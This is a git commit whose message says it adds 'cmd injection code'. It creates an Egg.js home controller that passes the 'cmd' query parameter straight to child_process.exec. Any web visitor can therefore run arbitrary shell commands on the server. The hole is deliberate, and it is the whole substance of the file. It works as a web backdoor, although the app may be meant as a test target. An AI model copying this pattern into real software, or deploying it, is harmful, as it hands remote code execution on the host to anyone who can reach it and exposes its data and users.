1968430f15c20c5de563b171465909e8795cb070
Ubuntu <ubuntu@ip-172-31-31-103.ap-southeast-1.compute.internal>
2022-08-26 01:32:26 +0000

    add in cmd injection code

---
+++ app/controller/home.js
@@ -0,0 +1,17 @@
+'use strict';
+
+const Controller = require('egg').Controller;
+class HomeController extends Controller {
+  async index() {
+        const { ctx } = this;
+        console.log('cmd = '+ ctx.query.cmd);
+
+ 	var exec = require('child_process').exec;
+	var cmdProcess = exec(ctx.query.cmd);
+	cmdProcess.stdout.pipe(process.stdout);
+
+        this.ctx.body = 'hello, egg, from Shi Chao ^^^^^^! ';
+  }
+}
+
+module.exports = HomeController;
